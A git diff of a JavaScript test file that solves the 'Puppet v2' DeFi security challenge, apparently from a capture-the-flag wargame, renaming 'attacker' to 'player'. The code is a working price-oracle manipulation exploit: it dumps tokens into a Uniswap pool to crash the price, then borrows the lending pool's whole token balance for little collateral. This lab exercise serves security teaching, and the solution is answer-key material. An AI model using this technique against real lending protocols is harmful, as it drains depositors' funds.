@@ -103,32 +103,30 @@ describe("[Challenge] Puppet v2", function () {
   it("Execution", async function () {
     /** CODE YOUR SOLUTION HERE */
     // Swap all attacker's initial tokens for ether to lower token price.
-    await this.token
-      .connect(attacker)
-      .approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
-    await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
-      ATTACKER_INITIAL_TOKEN_BALANCE, // Swap all of the attacker's tokens.
+    await token
+      .connect(player)
+      .approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);
+    await uniswapRouter.connect(player).swapExactTokensForETH(
+      PLAYER_INITIAL_TOKEN_BALANCE, // Swap all of the player's tokens.
       0, // Any ETH to get back will do
-      [this.token.address, this.uniswapRouter.WETH()], // Swap path from token to ether.
-      attacker.address, // ETH to attacker account.
+      [token.address, uniswapRouter.WETH()], // Swap path from token to ether.
+      player.address, // ETH to player account.
       9999999999 // Any deadline.
     );
     // Check required deposit
-    const collateral = await this.lendingPool.calculateDepositOfWETHRequired(
+    const collateral = await lendingPool.calculateDepositOfWETHRequired(
       POOL_INITIAL_TOKEN_BALANCE
     );
     console.log("Required collateral in eth:", collateral.toString());
-    // Check Attacker's ETH and push through if it is enough
+    // Check player's ETH and push through if it is enough
     console.log(
-      "Attacker`s eth balance:",
-      (await ethers.provider.getBalance(attacker.address)).toString()
+      "player`s eth balance:",
+      (await ethers.provider.getBalance(player.address)).toString()
     );
     // Convert ether to WETH, give allowance to pool contract and use it to borrow DVT.
-    await this.weth.connect(attacker).deposit({ value: collateral });
-    await this.weth
-      .connect(attacker)
-      .approve(this.lendingPool.address, collateral);
-    await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
+    await weth.connect(player).deposit({ value: collateral });
+    await weth.connect(player).approve(lendingPool.address, collateral);
+    await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE);
   });
 
   after(async function () {
